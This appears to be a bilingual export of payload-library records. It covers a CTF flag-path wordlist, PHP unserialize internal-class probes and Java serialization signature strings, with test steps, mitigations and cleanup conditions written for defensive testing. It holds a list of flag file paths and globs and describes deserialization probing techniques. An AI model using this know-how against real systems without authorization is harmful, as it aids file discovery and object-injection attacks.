description.en: Contains only flag paths, extensions, backup suffixes, and wildcard candidates with no execution semantics or application data flow, so it belongs in web wordlist tooling rather than RCE payloads.

overview.zh: CTF Flag 路径候选字典是工具命令或参考字典，不是独立 Payload。维护目标为路径候选如何按精确文件名、扩展名、备份后缀与通配模式去重并限制到 CTF 场景。其适用前提为：该清单没有请求方法、文件读取 API 或授权边界，只有在具体 CTF 文件发现工具中才有可执行上下文。迁移质量以原始路径字节、用途标签、目标工具和去重结果完整保存，不把字典命中自动定性为文件读取漏洞为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: CTF Flag Path Candidate Dictionary is tool command or reference data rather than an independent payload. It maintains how path candidates are deduplicated by exact names, extensions, backup suffixes, and wildcard patterns and constrained to CTF use. Its prerequisites are the list has no request method, file API, or authorization boundary and gains executable context only inside a concrete CTF file-discovery tool. Migration quality requires original path bytes, purpose tags, target tool, and deduplication result are preserved without turning a wordlist hit into a file-read finding; a runnable tool command or wordlist hit is not automatically a target finding.

vulnerability.zh: 该条目本身不建立漏洞。真实风险取决于该清单没有请求方法、文件读取 API 或授权边界，只有在具体 CTF 文件发现工具中才有可执行上下文，随后才可能用这些命令或特征审查“路径候选如何按精确文件名、扩展名、备份后缀与通配模式去重并限制到 CTF 场景”。必须把前置执行入口、目标环境和工具结果分开记录，避免把后渗透能力倒置成初始攻击链。
vulnerability.en: The entry does not establish a vulnerability. Risk depends on the list has no request method, file API, or authorization boundary and gains executable context only inside a concrete CTF file-discovery tool, after which the commands or signatures may examine how path candidates are deduplicated by exact names, extensions, backup suffixes, and wildcard patterns and constrained to CTF use. Keep the prerequisite execution entry, target environment, and tool result separate so post-exploitation capability is not inverted into an initial chain.

exploitation.zh: 逐行区分精确路径和 Shell 通配符，标记扩展名/备份变体并与现有字典精确去重，不在生产根目录执行通配枚举。迁移时逐行保留字节、来源、平台或版本标签与副作用说明，执行验证仅限一次性环境和固定无害标记；不支持、失效或仅用于识别的行必须显式标注。
exploitation.en: classify exact paths versus shell globs, tag extension and backup variants, and deduplicate against existing wordlists without running wildcard enumeration on production roots. Preserve bytes, provenance, platform or version tags, and side effects line by line; execute only in disposable environments with fixed harmless markers, and explicitly label unsupported, invalid, or signature-only lines.

mitigation.zh: 迁入 web-fuzzing-wordlists 并标记 CTF 专用范围；真实应用文件读取测试必须由单独 Payload 提供请求与授权证据。工具卡回归需要确认目标入口可达、原命令可复制、精确重复被合并、失效项仍可追溯，并且 Payload 导航不再重复展示纯命令或字典。
mitigation.en: move to web-fuzzing-wordlists with a CTF-only scope tag, while real application file-read testing requires a separate payload with request and authorization evidence. Tool-card regression must prove the destination is reachable, original commands remain copyable, exact duplicates are merged, invalid items remain traceable, and payload navigation no longer duplicates commands or dictionaries.

title.zh: 核对“CTF Flag 路径候选字典”来源与角色
title.en: Verify CTF Flag Path Candidate Dictionary provenance and role

description.zh: 确认该记录是命令或字典而非漏洞数据流，记录来源、平台、版本和前提“该清单没有请求方法、文件读取 API 或授权边界，只有在具体 CTF 文件发现工具中才有可执行上下文”。
description.en: Confirm the record is command or dictionary data rather than a vulnerability flow, recording provenance, platform, version, and prerequisites: the list has no request method, file API, or authorization boundary and gains executable context only inside a concrete CTF file-discovery tool.

title.zh: 逐行标注“CTF 文件路径字典”适用性
title.en: Tag CTF File Path Wordlist applicability line by line

description.zh: 按实现、运行时、传输或识别用途分类，记录失效语法、副作用与证据要求“原始路径字节、用途标签、目标工具和去重结果完整保存，不把字典命中自动定性为文件读取漏洞”。
description.en: Classify by implementation, runtime, transport, or signature use and record invalid syntax, side effects, and evidence requirements: original path bytes, purpose tags, target tool, and deduplication result are preserved without turning a wordlist hit into a file-read finding.

title.zh: 迁移“CTF Flag 路径候选字典”原始命令
title.en: Migrate original CTF Flag Path Candidate Dictionary commands

description.zh: 测试步骤为：逐行区分精确路径和 Shell 通配符，标记扩展名/备份变体并与现有字典精确去重，不在生产根目录执行通配枚举。完整保留原命令并只在一次性环境用固定标记验证。
description.en: classify exact paths versus shell globs, tag extension and backup variants, and deduplicate against existing wordlists without running wildcard enumeration on production roots. Preserve the original command in full and validate only with fixed markers in a disposable environment.

attackChain.payload:
/flag
/flag.txt
/flag.php
/flag.py
/flag.sh
/flag.jpg
/flag.png
/flag.html
/flag.js
/flag.json
/flag.xml
/flag*
/f*
/flag.bak
/flag.swp
/flag~
/flag.orig
/flag.old
/flag.new
/flag.bak.php
/flag.txt.bak
/flag.txt~
/flag.txt.swp
/flag.txt.orig
/flag.txt.old
/flag.txt.new
/flag.txt.php
/flag.txt.html
/flag.txt.js
/flag.txt.json
/flag.txt.xml

title.zh: 建立目标 Tool 回归
title.en: Regress the destination tool

description.zh: 实施“迁入 web-fuzzing-wordlists 并标记 CTF 专用范围；真实应用文件读取测试必须由单独 Payload 提供请求与授权证据”，确认工具入口、复制、去重、版本标签与导航均正确，且 Payload 树不再重复。
description.en: Apply move to web-fuzzing-wordlists with a CTF-only scope tag, while real application file-read testing requires a separate payload with request and authorization evidence and verify tool access, copying, deduplication, version tags, and navigation without payload-tree duplication.

review.rationale: CTF Flag 路径候选字典是纯工具命令或参考字典，应迁入 web-fuzzing-wordlists，保留原始字节、来源和适用前提。

prerequisites.zh: 已确认“CTF Flag 路径候选字典”是纯命令/字典，目标 Tool web-fuzzing-wordlists 均存在，并记录来源、版本及前提：该清单没有请求方法、文件读取 API 或授权边界，只有在具体 CTF 文件发现工具中才有可执行上下文。
prerequisites.en: The CTF Flag Path Candidate Dictionary record is command or dictionary data, destination tools web-fuzzing-wordlists exist, and provenance, version, and prerequisites are recorded: the list has no request method, file API, or authorization boundary and gains executable context only inside a concrete CTF file-discovery tool.

prerequisites.zh: 可在一次性主机或离线解析器逐行验证，并用原始路径字节、用途标签、目标工具和去重结果完整保存，不把字典命中自动定性为文件读取漏洞检查迁移完整性。
prerequisites.en: Every line can be checked in a disposable host or offline parser, using original path bytes, purpose tags, target tool, and deduplication result are preserved without turning a wordlist hit into a file-read finding for migration completeness.

analysis.zh: 本条阳性是命令/字典被准确迁移，原字节、来源和原始路径字节、用途标签、目标工具和去重结果完整保存，不把字典命中自动定性为文件读取漏洞保留；它不确认目标漏洞。命令可运行、已有 Shell 回连、字典命中或签名相似均不能证明“路径候选如何按精确文件名、扩展名、备份后缀与通配模式去重并限制到 CTF 场景”对应的初始漏洞。
analysis.en: A positive means accurate migration with original bytes, provenance, and original path bytes, purpose tags, target tool, and deduplication result are preserved without turning a wordlist hit into a file-read finding; it does not confirm a target vulnerability. Runnable commands, callbacks from an existing shell, wordlist hits, or signature similarity do not prove an initial vulnerability related to how path candidates are deduplicated by exact names, extensions, backup suffixes, and wildcard patterns and constrained to CTF use.

opsecTips.zh: CTF Flag 路径候选字典停止条件：默认离线解析；执行时只用一次性自有地址和固定标记。指向公共地址、生成真实载荷、打开交互 Shell 或触碰非测试文件时立即停止。 本条重点观察“路径候选如何按精确文件名、扩展名、备份后缀与通配模式去重并限制到 CTF 场景”。
opsecTips.en: CTF Flag Path Candidate Dictionary stop condition: Prefer offline parsing; use disposable owned destinations and fixed markers if execution is needed. Stop on public destinations, real payload generation, interactive shells, or non-test files. The entry-specific focus is how path candidates are deduplicated by exact names, extensions, backup suffixes, and wildcard patterns and constrained to CTF use.

opsecTips.zh: CTF Flag 路径候选字典清理条件：迁移后关闭监听器，删除 FIFO、生成文件、下载脚本和测试字典副本，销毁环境并核对目标 Tool 无重复或未标记失效行。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: CTF Flag Path Candidate Dictionary cleanup condition: Close listeners, remove FIFOs, generated files, downloads, and wordlist copies, destroy the environment, and verify destination tools have no duplicates or untagged invalid lines. Recheck that no triggerable state remains for this technique.

name.zh: PHP 序列化对象与内部类探针
name.en: PHP Serialized Objects and Internal-Class Probes

description.zh: 覆盖基础对象布局、长度变体、迭代器、SplFileObject、PDO、SQLite3 与 SimpleXMLElement，验证不可信数据是否进入 unserialize 及可用类集合。
description.en: Covers basic object layouts, length variants, iterators, SplFileObject, PDO, SQLite3, and SimpleXMLElement to test whether untrusted data reaches unserialize and which classes are available.

overview.zh: PHP 序列化对象与内部类探针检查unserialize 是否接受攻击者对象并实例化内部类或应用 gadget，进而产生文件、迭代或魔术方法副作用。成立前提为：不可信 Cookie、缓存、消息或请求参数进入 unserialize，allowed_classes 未限制，且目标 PHP 版本和类加载器提供相关类。反序列化风险必须通过输入序列化字节、PHP 版本、实际实例化类、魔术方法/文件审计和一次性标记能够关联进行确认；仅识别到流头、类名或标签，不足以证明对象图已被加载或产生副作用。
overview.en: PHP Serialized Objects and Internal-Class Probes checks whether unserialize accepts attacker objects and instantiates internal or application gadget classes that cause file, iterator, or magic-method side effects. It applies when untrusted cookies, caches, messages, or request values reach unserialize without allowed_classes restrictions and the target PHP version plus autoloader expose relevant classes. Deserialization risk requires serialized input bytes, PHP version, instantiated class, magic-method or file audit, and one-time marker correlate; a stream header, class name, or tag alone does not prove object loading or side effects.

vulnerability.zh: 根因是不可信 Cookie、缓存、消息或请求参数进入 unserialize，allowed_classes 未限制，且目标 PHP 版本和类加载器提供相关类，不可信数据因此可能触发“unserialize 是否接受攻击者对象并实例化内部类或应用 gadget，进而产生文件、迭代或魔术方法副作用”。真实影响由加载 API、允许类型、依赖版本、对象生命周期和服务权限共同决定，必须区分格式识别、对象实例化、gadget 触发与最终副作用四个阶段。
vulnerability.en: The root cause is untrusted cookies, caches, messages, or request values reach unserialize without allowed_classes restrictions and the target PHP version plus autoloader expose relevant classes, allowing whether unserialize accepts attacker objects and instantiates internal or application gadget classes that cause file, iterator, or magic-method side effects. Impact depends on the loader API, allowed types, dependency versions, object lifecycle, and service privileges, so format recognition, object construction, gadget triggering, and final side effects must remain separate.

exploitation.zh: 先用 stdClass 普通对象建立基线，再逐个内部类在隔离进程加载，所有路径替换为专用测试文件并禁用真实 gadget 副作用。在一次性 worker 中先验证正常对象基线，再将危险动作替换为固定临时标记；逐个格式或类加载并保存原始字节、解析日志和进程状态，不读取真实秘密、不访问外部网络。
exploitation.en: establish a normal stdClass baseline, load each internal class in an isolated process, replace all paths with dedicated test files, and disable real gadget side effects. Establish a normal-object baseline in a disposable worker, replace dangerous behavior with a fixed temporary marker, and load one format or class at a time while preserving bytes, parser logs, and process state without real secrets or external network access.

mitigation.zh: 停止反序列化不可信 PHP 对象，改用 JSON；必须兼容时签名数据、设置 allowed_classes=false 或最小类集并淘汰旧令牌。完成迁移后同时重放合法数据对象、类型越界对象和历史令牌，确认业务数据仍可读取，而语言对象、函数源码和未许可类均被稳定拒绝。
mitigation.en: stop deserializing untrusted PHP objects and use JSON; where compatibility remains, sign data, set allowed_classes false or a minimal set, and retire legacy tokens. After migration, replay valid data objects, out-of-schema types, and historical tokens to preserve business data while reliably rejecting language objects, function source, and unapproved classes.

title.zh: 确认“PHP 序列化对象与内部类探针”加载 API
title.en: Confirm the PHP Serialized Objects and Internal-Class Probes loader

description.zh: 定位真实反序列化函数、输入来源、允许类型与依赖版本，核对前提“不可信 Cookie、缓存、消息或请求参数进入 unserialize，allowed_classes 未限制，且目标 PHP 版本和类加载器提供相关类”。
description.en: Locate the real deserializer, source, allowed types, and dependency versions, confirming that untrusted cookies, caches, messages, or request values reach unserialize without allowed_classes restrictions and the target PHP version plus autoloader expose relevant classes.

title.zh: 建立“PHP 不安全反序列化”正常对象基线
title.en: Establish the Unsafe PHP Deserialization object baseline

description.zh: 加载固定数据对象并记录类型、生命周期与副作用，再以“输入序列化字节、PHP 版本、实际实例化类、魔术方法/文件审计和一次性标记能够关联”作为异常对象证据。
description.en: Load a fixed data object and record types, lifecycle, and side effects, accepting serialized input bytes, PHP version, instantiated class, magic-method or file audit, and one-time marker correlate as abnormal-object evidence.

title.zh: 隔离验证“PHP 序列化对象与内部类探针”对象
title.en: Validate the PHP Serialized Objects and Internal-Class Probes object in isolation

description.zh: 测试步骤为：先用 stdClass 普通对象建立基线，再逐个内部类在隔离进程加载，所有路径替换为专用测试文件并禁用真实 gadget 副作用。保持原字节不变用于引用，实际运行时将危险动作替换为一次性标记。
description.en: establish a normal stdClass baseline, load each internal class in an isolated process, replace all paths with dedicated test files, and disable real gadget side effects. Preserve original bytes for reference while replacing dangerous runtime effects with one-time markers.

title.zh: 迁移到安全数据格式
title.en: Migrate to a safe data format

description.zh: 实施“停止反序列化不可信 PHP 对象，改用 JSON；必须兼容时签名数据、设置 allowed_classes=false 或最小类集并淘汰旧令牌”并重放合法对象、未许可类型和历史令牌，确认数据兼容且对象代码不再加载。
description.en: Apply stop deserializing untrusted PHP objects and use JSON; where compatibility remains, sign data, set allowed_classes false or a minimal set, and retire legacy tokens, replay valid objects, unapproved types, and legacy tokens, and confirm data compatibility without loading object code.

review.rationale: PHP 序列化对象与内部类探针保留为 Payload，因为它描述具体输入到解析器、运行时或文件/进程能力的数据流，并有明确证据标准。

prerequisites.zh: 已确认“PHP 序列化对象与内部类探针”的真实 loader、输入格式、依赖版本和允许类型，并满足：不可信 Cookie、缓存、消息或请求参数进入 unserialize，allowed_classes 未限制，且目标 PHP 版本和类加载器提供相关类。
prerequisites.en: The real loader, format, dependency versions, and allowed types for PHP Serialized Objects and Internal-Class Probes are known, and untrusted cookies, caches, messages, or request values reach unserialize without allowed_classes restrictions and the target PHP version plus autoloader expose relevant classes.

prerequisites.zh: 可在无外网的一次性进程加载正常对象，并观察输入序列化字节、PHP 版本、实际实例化类、魔术方法/文件审计和一次性标记能够关联。
prerequisites.en: A disposable no-network process can load a normal object and observe serialized input bytes, PHP version, instantiated class, magic-method or file audit, and one-time marker correlate.

analysis.zh: 阳性必须证明输入到达 loader、对象或函数被构造、触发路径执行，并取得输入序列化字节、PHP 版本、实际实例化类、魔术方法/文件审计和一次性标记能够关联。流头、Base64、类名、YAML 标签、解析异常或依赖中存在 gadget 均是假阳性，不能证明“unserialize 是否接受攻击者对象并实例化内部类或应用 gadget，进而产生文件、迭代或魔术方法副作用”。
analysis.en: A positive proves loader reachability, object or function construction, trigger execution, and serialized input bytes, PHP version, instantiated class, magic-method or file audit, and one-time marker correlate. Headers, Base64, class names, YAML tags, parser errors, or a gadget merely present in dependencies are false positives and do not prove whether unserialize accepts attacker objects and instantiates internal or application gadget classes that cause file, iterator, or magic-method side effects.

opsecTips.zh: PHP 序列化对象与内部类探针停止条件：将危险动作替换为一次性临时标记；若 loader 尝试联网、加载远程类、访问真实文件或启动非标记进程，立即杀死隔离进程。 本条重点观察“unserialize 是否接受攻击者对象并实例化内部类或应用 gadget，进而产生文件、迭代或魔术方法副作用”。
opsecTips.en: PHP Serialized Objects and Internal-Class Probes stop condition: Replace dangerous effects with a one-time marker; kill the isolated process on network access, remote class loading, real-file access, or a non-marker process. The entry-specific focus is whether unserialize accepts attacker objects and instantiates internal or application gadget classes that cause file, iterator, or magic-method side effects.

opsecTips.zh: PHP 序列化对象与内部类探针清理条件：每个对象使用新进程；测试后销毁进程、临时目录和缓存，轮换测试会话材料，并确认类、原型或全局状态无残留。 清理完成后再次确认该技术路径没有残留可触发状态。
opsecTips.en: PHP Serialized Objects and Internal-Class Probes cleanup condition: Use a fresh process per object; destroy processes, temporary directories, and caches, rotate test session material, and verify no class, prototype, or global state remains. Recheck that no triggerable state remains for this technique.

name.zh: Java 序列化头与类名特征字典
name.en: Java Serialization Header and Class-Name Signature Dictionary

description.zh: 全部行是 Base64/十六进制 Java 流头或常见类名片段，没有完整 gadget 与对象图，适合作为反序列化识别工具特征而非可执行 Payload。
description.en: All lines are Base64 or hexadecimal Java stream headers and common class-name fragments without a complete gadget graph, so they belong as deserialization identification signatures rather than executable payloads.

overview.zh: Java 序列化头与类名特征字典是工具命令或参考字典，不是独立 Payload。维护目标为流魔数、编码形式和序列化类名如何用于识别 Java 对象流，同时避免把截断样本当作有效 gadget。其适用前提为：这些字节只可用于协议或日志识别，没有完整对象图、目标类路径和 readObject 调用链。迁移质量以每行编码可解码为预期流头或类名，来源和用途标签明确，工具不会尝试执行截断对象为准，不能把工具命令可运行或字典命中自动报告为目标漏洞。
overview.en: Java Serialization Header and Class-Name Signature Dictionary is tool command or reference data rather than an independent payload. It maintains how stream magic, encoding forms, and serialized class names identify Java object streams without presenting truncated samples as working gadgets.
